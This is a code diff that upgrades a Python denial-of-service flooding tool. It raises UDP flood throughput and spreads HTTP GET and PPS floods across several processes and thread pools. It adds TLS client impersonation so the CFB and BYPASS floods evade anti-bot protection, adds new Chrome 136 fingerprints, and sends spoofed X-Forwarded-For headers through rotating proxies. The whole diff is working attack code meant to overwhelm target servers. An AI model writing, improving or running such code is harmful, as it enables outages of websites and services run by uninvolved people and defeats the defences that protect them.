@@ -565,8 +565,16 @@ class Layer4(Thread):
     def UDP(self) -> None:
         s = None
         with suppress(Exception), socket(AF_INET, SOCK_DGRAM) as s:
-            while Tools.sendto(s, randbytes(1024), self._target):
-                continue
+            try:
+                s.setsockopt(SOL_SOCKET, SO_SNDBUF, 4 * 1024 * 1024)
+            except Exception:
+                pass
+            _buf = randbytes(4096)
+            while True:
+                size = randint(512, 4096)
+                pkt = _buf[:size]
+                if not Tools.sendto(s, pkt, self._target):
+                    break
         Tools.safe_close(s)
 
     def OVHUDP(self) -> None:
@@ -1088,13 +1096,40 @@ class HttpFlood(Thread):
         Tools.safe_close(s)
 
     def PPS(self) -> None:
-        payload: Any = str.encode(self._defaultpayload +
-                                  f"Host: {self._target.authority}\r\n\r\n")
-        s = None
-        with suppress(Exception), self.open_connection() as s:
-            for _ in range(self._rpc):
-                Tools.send(s, payload)
-        Tools.safe_close(s)
+        global REQUESTS_SENT, BYTES_SEND
+        num_processes = max(1, min(cpu_count(), 8))
+        rpc_per_process = max(self._rpc // num_processes, 1)
+        workers_per_process = min(rpc_per_process * 8, 200)
+
+        ua_data = list(self._useragents)
+        proxy_data = []
+        if self._proxies:
+            for p in self._proxies:
+                try:
+                    proxy_data.append((p.type.value, p.host, p.port, p.username or "", p.password or ""))
+                except Exception:
+                    pass
+        target_host = self._target.host
+        target_port = self._target.port or (443 if self._target.scheme == "https" else 80)
+        target_scheme = self._target.scheme
+        target_authority = self._target.authority
+        raw_target = self._raw_target
+        is_https = self._target.scheme.lower() == "https"
+
+        procs = []
+        for _ in range(num_processes):
+            p = Process(
+                target=_pps_process_entry,
+                args=(workers_per_process, rpc_per_process,
+                      target_host, target_port, target_scheme,
+                      target_authority, raw_target, is_https,
+                      proxy_data, ua_data),
+                daemon=True,
+            )
+            p.start()
+            procs.append(p)
+        for p in procs:
+            p.join()
 
     # ── KILLER v3: Browser fingerprint order templates ─────────────────────
     _KILLER_CHROME_ORDER = (
@@ -1252,6 +1287,36 @@ class HttpFlood(Thread):
          "platform": '"Windows"',
          "device_memory": ("8", "16"),
          "viewport": ("1920x1080", "1366x768"),
+         "ect": ("4g", "3g"),
+         "rtt": ("50", "100"),
+         "downlink": ("10", "5"),
+        },
+        # Chrome 136 on Windows 10/11
+        {"ua_prefix": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36",
+         "order": _KILLER_CHROME_ORDER,
+         "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
+         "languages": ("en-US,en;q=0.9", "en-GB,en-US;q=0.9,en;q=0.8",
+                       "de-DE,de;q=0.9,en-US;q=0.8,en;q=0.7",
+                       "fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7"),
+         "sec_ch_ua": '"Chromium";v="136", "Google Chrome";v="136", "Not?A_Brand";v="99"',
+         "platform": '"Windows"',
+         "device_memory": ("8", "16"),
+         "viewport": ("1920x1080", "2560x1440", "1366x768"),
+         "ect": ("4g", "3g"),
+         "rtt": ("50", "100"),
+         "downlink": ("10", "5"),
+        },
+        # Chrome 136 on macOS
+        {"ua_prefix": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36",
+         "order": _KILLER_CHROME_ORDER,
+         "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
+         "languages": ("en-US,en;q=0.9", "en-GB,en;q=0.8",
+                       "ja-JP,ja;q=0.9,en;q=0.8",
+                       "fr-FR,fr;q=0.9,en;q=0.8"),
+         "sec_ch_ua": '"Not_A Brand";v="8", "Chromium";v="136", "Google Chrome";v="136"',
+         "platform": '"macOS"',
+         "device_memory": ("8", "16"),
+         "viewport": ("2560x1600", "1440x900", "1680x1050"),
          "ect": ("4g", "3g"),
          "rtt": ("50", "100"),
          "downlink": ("10", "5"),
@@ -1782,12 +1847,41 @@ class HttpFlood(Thread):
         return "; ".join(parts) if parts else ""
 
     def GET(self) -> None:
-        payload: bytes = self.generate_payload()
-        s = None
-        with suppress(Exception), self.open_connection() as s:
-            for _ in range(self._rpc):
-                Tools.send(s, payload)
-        Tools.safe_close(s)
+        global REQUESTS_SENT, BYTES_SEND
+        num_processes = max(1, min(cpu_count(), 8))
+        rpc_per_process = max(self._rpc // num_processes, 1)
+        workers_per_process = min(rpc_per_process * 8, 200)
+
+        ua_data = list(self._useragents)
+        ref_data = list(self._referers)
+        proxy_data = []
+        if self._proxies:
+            for p in self._proxies:
+                try:
+                    proxy_data.append((p.type.value, p.host, p.port, p.username or "", p.password or ""))
+                except Exception:
+                    pass
+        target_host = self._target.host
+        target_port = self._target.port or (443 if self._target.scheme == "https" else 80)
+        target_scheme = self._target.scheme
+        target_authority = self._target.authority
+        raw_target = self._raw_target
+        is_https = self._target.scheme.lower() == "https"
+
+        procs = []
+        for _ in range(num_processes):
+            p = Process(
+                target=_get_process_entry,
+                args=(workers_per_process, rpc_per_process,
+                      target_host, target_port, target_scheme,
+                      target_authority, raw_target, is_https,
+                      proxy_data, ua_data, ref_data),
+                daemon=True,
+            )
+            p.start()
+            procs.append(p)
+        for p in procs:
+            p.join()
 
     def BOT(self) -> None:
         payload: bytes = self.generate_payload()
@@ -1834,6 +1928,28 @@ class HttpFlood(Thread):
 
     def CFB(self):
         global REQUESTS_SENT, BYTES_SEND
+        try:
+            from files.tls_client import create_session as _curl_session, HAS_CURL_CFFI
+        except ImportError:
+            HAS_CURL_CFFI = False
+
+        if HAS_CURL_CFFI:
+            s = _curl_session()
+            if s is not None:
+                try:
+                    for _ in range(self._rpc):
+                        resp = s.get(self._target.human_repr(), timeout=9,
+                                     allow_redirects=False)
+                        REQUESTS_SENT += 1
+                        BYTES_SEND += len(resp.content)
+                except Exception:
+                    pass
+                try:
+                    s.close()
+                except Exception:
+                    pass
+                return
+
         pro = None
         if self._proxies:
             pro = randchoice(self._proxies)
@@ -1926,6 +2042,28 @@ class HttpFlood(Thread):
 
     def BYPASS(self):
         global REQUESTS_SENT, BYTES_SEND
+        try:
+            from files.tls_client import create_session as _curl_session, HAS_CURL_CFFI
+        except ImportError:
+            HAS_CURL_CFFI = False
+
+        if HAS_CURL_CFFI:
+            s = _curl_session()
+            if s is not None:
+                try:
+                    for _ in range(self._rpc):
+                        resp = s.get(self._target.human_repr(), timeout=9,
+                                     allow_redirects=False)
+                        REQUESTS_SENT += 1
+                        BYTES_SEND += len(resp.content)
+                except Exception:
+                    pass
+                try:
+                    s.close()
+                except Exception:
+                    pass
+                return
+
         pro = None
         if self._proxies:
             pro = randchoice(self._proxies)
@@ -2320,6 +2458,12 @@ def _killer_process_entry(max_workers, rpc,
             pass
 
     def _open_conn():
+        if is_https and HAS_CURL_CFFI:
+            try:
+                from files.tls_client import create_session as _mk_session
+                return _mk_session()
+            except Exception:
+                pass
         if proxy_objects:
             sock = rc(proxy_objects).open_socket(AF_INET, SOCK_STREAM)
         else:
@@ -2377,6 +2521,8 @@ def _killer_process_entry(max_workers, rpc,
         with pool_lock:
             while conn_pool:
                 s = conn_pool.pop()
+                if hasattr(s, 'impersonate'):
+                    return s
                 try:
                     s.setblocking(False)
                     s.recv(0, 0x400 | 0x40)
@@ -2395,6 +2541,12 @@ def _killer_process_entry(max_workers, rpc,
     def return_connection(s):
         if s is None:
             return
+        if hasattr(s, 'impersonate'):
+            try:
+                s.close()
+            except Exception:
+                pass
+            return
         with pool_lock:
             if len(conn_pool) < max_workers:
                 conn_pool.append(s)
@@ -2411,6 +2563,8 @@ def _killer_process_entry(max_workers, rpc,
             return
 
         try:
+            is_curl = hasattr(s, 'impersonate')
+
             sid = id(s)
             if sid not in session_cache:
                 session_cache[sid] = _KillerSession()
@@ -2445,74 +2599,99 @@ def _killer_process_entry(max_workers, rpc,
             if profile_steps and profile_name != "RAW_FLOOD":
                 for i, (method, path) in enumerate(profile_steps):
                     path = path.replace("{rand}", PT.Random.rand_str(8))
-                    payload = _killer_build_request_standalone(
-                        method, path, fp, target_authority,
-                        ref_list, cached_target_path)
-                    if not Tools.send(s, payload):
-                        burst_ctrl.record_failure()
-                        break
-                    burst_ctrl.record_success()
+                    if is_curl:
+                        url = "%s://%s%s" % (target_scheme, target_authority, path)
+                        try:
+                            s.request(method, url, timeout=9, allow_redirects=False)
+                            burst_ctrl.record_success()
+                        except Exception:
+                            burst_ctrl.record_failure()
+                            break
+                    else:
+                        payload = _killer_build_request_standalone(
+                            method, path, fp, target_authority,
+                            ref_list, cached_target_path)
+                        if not Tools.send(s, payload):
+                            burst_ctrl.record_failure()
+                            break
+                        burst_ctrl.record_success()
                     sleep(uniform(0.001, 0.005))
             else:
                 batch = min(rpc, randint(15, 40))
                 for _ in range(batch):
                     method = rc(("GET", "GET", "GET", "POST", "HEAD"))
                     rand_path = _killer_rand_path_fast(_KILLER_PATHS_STANDALONE)
-                    cookie = ks.get_cookie_header()
-                    spoof = PT.Random.rand_ipv4()
 
-                    parts = [
-                        "%s %s HTTP/1.1\r\n" % (method, rand_path),
-                        "Host: %s\r\n" % target_authority,
-                        "User-Agent: %s\r\n" % fp["ua_prefix"],
-                        "Accept: %s\r\n" % rc(fp["accept"]),
-                        "Accept-Language: %s\r\n" % rc(fp["languages"]),
-                        "Accept-Encoding: %s\r\n" % rc((
-                            "gzip, deflate, br, zstd",
-                            "gzip, deflate, br",
-                            "gzip, deflate")),
-                        "X-Forwarded-For: %s\r\n" % spoof,
-                    ]
-                    if fp.get("sec_ch_ua"):
-                        parts.append('Sec-CH-UA: %s\r\n' % fp["sec_ch_ua"])
-                        parts.append('Sec-CH-UA-Mobile: ?0\r\n')
-                        parts.append('Sec-CH-UA-Platform: %s\r\n' % fp["platform"])
-                    if cookie:
-                        parts.append("Cookie: %s\r\n" % cookie)
-                    if rc([True, False]):
-                        parts.append("DNT: 1\r\n")
-                    if rc([True, False]):
-                        parts.append("Cache-Control: %s\r\n" % rc(("no-cache", "no-store")))
-                    if rc([True, False]):
-                        parts.append("Connection: keep-alive\r\n")
-                    if rc([True, True, False]):
-                        parts.append("Sec-Fetch-Dest: %s\r\n" % rc(("document", "empty", "script")))
-                        parts.append("Sec-Fetch-Mode: %s\r\n" % rc(("navigate", "cors")))
-                        parts.append("Sec-Fetch-Site: %s\r\n" % rc(("none", "same-origin")))
-                        parts.append("Sec-Fetch-User: ?1\r\n")
-                    if rc([True, False]):
-                        parts.append("Upgrade-Insecure-Requests: 1\r\n")
-                    if rc([True, False, False, False]):
-                        parts.append("Referer: %s\r\n" % _killer_build_referrer(target_authority))
-                    if fp.get("device_memory") and rc([True, False, False, False, False]):
-                        parts.append("Device-Memory: %s\r\n" % rc(fp["device_memory"]))
-                    if rc([True, False, False, False, False, False, False, False, False]):
-                        parts.append("Priority: %s\r\n" % rc(("u=0, i", "u=1, i")))
-                    parts.append("\r\n")
-                    if method == "POST":
-                        rand_data = PT.Random.rand_str(randint(32, 128))
-                        parts.insert(-1, "Content-Type: application/json\r\n")
-                        parts.insert(-1, "Content-Length: %d\r\n" % (len(rand_data) + 16))
-                        parts.append('{"data":"%s"}' % rand_data)
+                    if is_curl:
+                        url = "%s://%s%s" % (target_scheme, target_authority, rand_path)
+                        try:
+                            s.request(method, url, timeout=9, allow_redirects=False)
+                            burst_ctrl.record_success()
+                        except Exception:
+                            burst_ctrl.record_failure()
+                            break
+                    else:
+                        cookie = ks.get_cookie_header()
+                        spoof = PT.Random.rand_ipv4()
 
-                    payload = str.encode("".join(parts))
-                    if not Tools.send(s, payload):
-                        burst_ctrl.record_failure()
-                        break
-                    burst_ctrl.record_success()
+                        parts = [
+                            "%s %s HTTP/1.1\r\n" % (method, rand_path),
+                            "Host: %s\r\n" % target_authority,
+                            "User-Agent: %s\r\n" % fp["ua_prefix"],
+                            "Accept: %s\r\n" % rc(fp["accept"]),
+                            "Accept-Language: %s\r\n" % rc(fp["languages"]),
+                            "Accept-Encoding: %s\r\n" % rc((
+                                "gzip, deflate, br, zstd",
+                                "gzip, deflate, br",
+                                "gzip, deflate")),
+                            "X-Forwarded-For: %s\r\n" % spoof,
+                        ]
+                        if fp.get("sec_ch_ua"):
+                            parts.append('Sec-CH-UA: %s\r\n' % fp["sec_ch_ua"])
+                            parts.append('Sec-CH-UA-Mobile: ?0\r\n')
+                            parts.append('Sec-CH-UA-Platform: %s\r\n' % fp["platform"])
+                        if cookie:
+                            parts.append("Cookie: %s\r\n" % cookie)
+                        if rc([True, False]):
+                            parts.append("DNT: 1\r\n")
+                        if rc([True, False]):
+                            parts.append("Cache-Control: %s\r\n" % rc(("no-cache", "no-store")))
+                        if rc([True, False]):
+                            parts.append("Connection: keep-alive\r\n")
+                        if rc([True, True, False]):
+                            parts.append("Sec-Fetch-Dest: %s\r\n" % rc(("document", "empty", "script")))
+                            parts.append("Sec-Fetch-Mode: %s\r\n" % rc(("navigate", "cors")))
+                            parts.append("Sec-Fetch-Site: %s\r\n" % rc(("none", "same-origin")))
+                            parts.append("Sec-Fetch-User: ?1\r\n")
+                        if rc([True, False]):
+                            parts.append("Upgrade-Insecure-Requests: 1\r\n")
+                        if rc([True, False, False, False]):
+                            parts.append("Referer: %s\r\n" % _killer_build_referrer(target_authority))
+                        if fp.get("device_memory") and rc([True, False, False, False, False]):
+                            parts.append("Device-Memory: %s\r\n" % rc(fp["device_memory"]))
+                        if rc([True, False, False, False, False, False, False, False, False]):
+                            parts.append("Priority: %s\r\n" % rc(("u=0, i", "u=1, i")))
+                        parts.append("\r\n")
+                        if method == "POST":
+                            rand_data = PT.Random.rand_str(randint(32, 128))
+                            parts.insert(-1, "Content-Type: application/json\r\n")
+                            parts.insert(-1, "Content-Length: %d\r\n" % (len(rand_data) + 16))
+                            parts.append('{"data":"%s"}' % rand_data)
+
+                        payload = str.encode("".join(parts))
+                        if not Tools.send(s, payload):
+                            burst_ctrl.record_failure()
+                            break
+                        burst_ctrl.record_success()
                     sleep(uniform(0.0001, 0.001))
 
-            return_conn(s)
+            if not is_curl:
+                return_conn(s)
+            else:
+                try:
+                    s.close()
+                except Exception:
+                    pass
         except Exception:
             try:
                 s.close()
@@ -2538,6 +2717,344 @@ def _killer_process_entry(max_workers, rpc,
             sleep(base_delay * uniform(0.1, 0.5))
             if len(session_cache) > max_workers * 2:
                 session_cache.clear()
+
+
+def _pps_process_entry(max_workers, rpc,
+                       target_host, target_port, target_scheme,
+                       target_authority, raw_target, is_https,
+                       proxy_data, useragents):
+    from random import uniform, randint, choice as rc
+    from socket import AF_INET, SOCK_STREAM, socket, SOL_SOCKET, SO_REUSEADDR, SO_SNDBUF, SO_RCVBUF
+    from socket import TCP_NODELAY, IPPROTO_TCP
+    from concurrent.futures import ThreadPoolExecutor
+    from ssl import SSLContext, create_default_context, CERT_NONE
+    import ssl as _ssl
+    from PyRoxy import Proxy, ProxyType, Tools as PT
+
+    try:
+        from files.tls_client import create_session as _create_tls_session, HAS_CURL_CFFI
+    except ImportError:
+        HAS_CURL_CFFI = False
+
+    ctx = create_default_context()
+    ctx.check_hostname = False
+    ctx.verify_mode = CERT_NONE
+    if hasattr(ctx, "minimum_version") and hasattr(_ssl, "TLSVersion"):
+        ctx.minimum_version = _ssl.TLSVersion.TLSv1_2
+
+    proxy_objects = []
+    for pdata in proxy_data:
+        try:
+            ptype = ProxyType(pdata[0])
+            proxy_objects.append(Proxy(ptype, pdata[1], pdata[2], pdata[3] or None, pdata[4] or None))
+        except Exception:
+            pass
+
+    def _open_conn():
+        if is_https and HAS_CURL_CFFI:
+            try:
+                from files.tls_client import create_session as _mk
+                return _mk()
+            except Exception:
+                pass
+        if proxy_objects:
+            sock = rc(proxy_objects).open_socket(AF_INET, SOCK_STREAM)
+        else:
+            sock = socket(AF_INET, SOCK_STREAM)
+        sock.setsockopt(IPPROTO_TCP, TCP_NODELAY, 1)
+        try:
+            sock.setsockopt(SOL_SOCKET, SO_REUSEADDR, 1)
+        except Exception:
+            pass
+        try:
+            sock.setsockopt(SOL_SOCKET, SO_SNDBUF, 1024 * 1024)
+            sock.setsockopt(SOL_SOCKET, SO_RCVBUF, 16 * 1024)
+        except Exception:
+            pass
+        try:
+            sock.setsockopt(SOL_SOCKET, SO_KEEPALIVE, 1)
+        except Exception:
+            pass
+        sock.settimeout(3.0)
+        sock.connect(raw_target)
+        if is_https:
+            sock = ctx.wrap_socket(sock, server_hostname=target_host,
+                                   server_side=False, do_handshake_on_connect=True,
+                                   suppress_ragged_eofs=True)
+        return sock
+
+    conn_pool = []
+    pool_lock = Lock()
+
+    def refill_pool():
+        while True:
+            with pool_lock:
+                if len(conn_pool) >= max_workers:
+                    break
+            try:
+                s = _open_conn()
+                with pool_lock:
+                    conn_pool.append(s)
+            except Exception:
+                sleep(0.01)
+
+    def get_connection():
+        with pool_lock:
+            while conn_pool:
+                s = conn_pool.pop()
+                if hasattr(s, 'impersonate'):
+                    return s
+                try:
+                    s.setblocking(False)
+                    s.recv(0, 0x400 | 0x40)
+                    s.setblocking(True)
+                    return s
+                except (BlockingIOError, OSError):
+                    try:
+                        s.close()
+                    except Exception:
+                        pass
+        try:
+            return _open_conn()
+        except Exception:
+            return None
+
+    def return_connection(s):
+        if s is None or hasattr(s, 'impersonate'):
+            return
+        with pool_lock:
+            if len(conn_pool) < max_workers:
+                conn_pool.append(s)
+                return
+        try:
+            s.close()
+        except Exception:
+            pass
+
+    def _worker(get_conn, return_conn, rpc_count):
+        s = get_conn()
+        if s is None:
+            return
+        try:
+            is_curl = hasattr(s, 'impersonate')
+            batch = min(rpc, randint(15, 40))
+            for _ in range(batch):
+                if is_curl:
+                    try:
+                        s.get(target_authority, timeout=9, allow_redirects=False)
+                    except Exception:
+                        break
+                else:
+                    method = rc(("GET", "GET", "HEAD"))
+                    path = rc(("/", "/%s" % PT.Random.rand_str(8),
+                               "/%s/%s" % (PT.Random.rand_str(4), PT.Random.rand_str(6))))
+                    ua = rc(useragents)
+                    payload = ("%s %s HTTP/1.1\r\n"
+                               "Host: %s\r\n"
+                               "User-Agent: %s\r\n"
+                               "Accept-Encoding: gzip, deflate\r\n"
+                               "Connection: keep-alive\r\n\r\n") % (method, path, target_authority, ua)
+                    if not Tools.send(s, str.encode(payload)):
+                        break
+                sleep(uniform(0.0001, 0.0005))
+            if not is_curl:
+                return_conn(s)
+            else:
+                try:
+                    s.close()
+                except Exception:
+                    pass
+        except Exception:
+            try:
+                s.close()
+            except Exception:
+                pass
+
+    refill_pool()
+    with ThreadPoolExecutor(max_workers=max_workers) as pool:
+        while True:
+            refill_pool()
+            for _ in range(max_workers):
+                pool.submit(_worker, get_connection, return_connection, rpc)
+            sleep(0.01)
+
+
+def _get_process_entry(max_workers, rpc,
+                       target_host, target_port, target_scheme,
+                       target_authority, raw_target, is_https,
+                       proxy_data, useragents, referers):
+    from random import uniform, randint, choice as rc
+    from socket import AF_INET, SOCK_STREAM, socket, SOL_SOCKET, SO_REUSEADDR, SO_SNDBUF, SO_RCVBUF
+    from socket import TCP_NODELAY, IPPROTO_TCP
+    from concurrent.futures import ThreadPoolExecutor
+    from ssl import SSLContext, create_default_context, CERT_NONE
+    import ssl as _ssl
+    from PyRoxy import Proxy, ProxyType, Tools as PT
+
+    try:
+        from files.tls_client import create_session as _create_tls_session, HAS_CURL_CFFI
+    except ImportError:
+        HAS_CURL_CFFI = False
+
+    ctx = create_default_context()
+    ctx.check_hostname = False
+    ctx.verify_mode = CERT_NONE
+    if hasattr(ctx, "minimum_version") and hasattr(_ssl, "TLSVersion"):
+        ctx.minimum_version = _ssl.TLSVersion.TLSv1_2
+
+    proxy_objects = []
+    for pdata in proxy_data:
+        try:
+            ptype = ProxyType(pdata[0])
+            proxy_objects.append(Proxy(ptype, pdata[1], pdata[2], pdata[3] or None, pdata[4] or None))
+        except Exception:
+            pass
+
+    def _open_conn():
+        if is_https and HAS_CURL_CFFI:
+            try:
+                from files.tls_client import create_session as _mk
+                return _mk()
+            except Exception:
+                pass
+        if proxy_objects:
+            sock = rc(proxy_objects).open_socket(AF_INET, SOCK_STREAM)
+        else:
+            sock = socket(AF_INET, SOCK_STREAM)
+        sock.setsockopt(IPPROTO_TCP, TCP_NODELAY, 1)
+        try:
+            sock.setsockopt(SOL_SOCKET, SO_REUSEADDR, 1)
+        except Exception:
+            pass
+        try:
+            sock.setsockopt(SOL_SOCKET, SO_SNDBUF, 1024 * 1024)
+            sock.setsockopt(SOL_SOCKET, SO_RCVBUF, 16 * 1024)
+        except Exception:
+            pass
+        try:
+            sock.setsockopt(SOL_SOCKET, SO_KEEPALIVE, 1)
+        except Exception:
+            pass
+        sock.settimeout(3.0)
+        sock.connect(raw_target)
+        if is_https:
+            sock = ctx.wrap_socket(sock, server_hostname=target_host,
+                                   server_side=False, do_handshake_on_connect=True,
+                                   suppress_ragged_eofs=True)
+        return sock
+
+    conn_pool = []
+    pool_lock = Lock()
+
+    def refill_pool():
+        while True:
+            with pool_lock:
+                if len(conn_pool) >= max_workers:
+                    break
+            try:
+                s = _open_conn()
+                with pool_lock:
+                    conn_pool.append(s)
+            except Exception:
+                sleep(0.01)
+
+    def get_connection():
+        with pool_lock:
+            while conn_pool:
+                s = conn_pool.pop()
+                if hasattr(s, 'impersonate'):
+                    return s
+                try:
+                    s.setblocking(False)
+                    s.recv(0, 0x400 | 0x40)
+                    s.setblocking(True)
+                    return s
+                except (BlockingIOError, OSError):
+                    try:
+                        s.close()
+                    except Exception:
+                        pass
+        try:
+            return _open_conn()
+        except Exception:
+            return None
+
+    def return_connection(s):
+        if s is None or hasattr(s, 'impersonate'):
+            return
+        with pool_lock:
+            if len(conn_pool) < max_workers:
+                conn_pool.append(s)
+                return
+        try:
+            s.close()
+        except Exception:
+            pass
+
+    def _worker(get_conn, return_conn, rpc_count):
+        s = get_conn()
+        if s is None:
+            return
+        try:
+            is_curl = hasattr(s, 'impersonate')
+            batch = min(rpc, randint(10, 30))
+            for _ in range(batch):
+                ua = rc(useragents)
+                ref = rc(referers)
+                spoof = PT.Random.rand_ipv4()
+
+                if is_curl:
+                    try:
+                        s.get(target_authority, headers={
+                            "User-Agent": ua,
+                            "Referer": "%s%s" % (ref, target_authority),
+                            "X-Forwarded-For": spoof,
+                        }, timeout=9, allow_redirects=False)
+                    except Exception:
+                        break
+                else:
+                    path = rc(("/", "/%s" % PT.Random.rand_str(8),
+                               "/%s/%s" % (PT.Random.rand_str(4), PT.Random.rand_str(6)),
+                               "/?q=%s" % PT.Random.rand_str(6)))
+                    payload = ("GET %s HTTP/1.1\r\n"
+                               "Host: %s\r\n"
+                               "User-Agent: %s\r\n"
+                               "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
+                               "Accept-Language: en-US,en;q=0.9\r\n"
+                               "Accept-Encoding: gzip, deflate, br\r\n"
+                               "Referer: %s%s\r\n"
+                               "X-Forwarded-For: %s\r\n"
+                               "Connection: keep-alive\r\n"
+                               "Cache-Control: no-cache\r\n"
+                               "Sec-Fetch-Dest: document\r\n"
+                               "Sec-Fetch-Mode: navigate\r\n"
+                               "Sec-Fetch-Site: none\r\n"
+                               "Sec-Fetch-User: ?1\r\n"
+                               "Upgrade-Insecure-Requests: 1\r\n\r\n") % (
+                        path, target_authority, ua, ref, target_authority, spoof)
+                    if not Tools.send(s, str.encode(payload)):
+                        break
+                sleep(uniform(0.0001, 0.0005))
+            if not is_curl:
+                return_conn(s)
+            else:
+                try:
+                    s.close()
+                except Exception:
+                    pass
+        except Exception:
+            try:
+                s.close()
+            except Exception:
+                pass
+
+    refill_pool()
+    with ThreadPoolExecutor(max_workers=max_workers) as pool:
+        while True:
+            refill_pool()
+            for _ in range(max_workers):
+                pool.submit(_worker, get_connection, return_connection, rpc)
+            sleep(0.01)
 
 
 class ProxyManager:
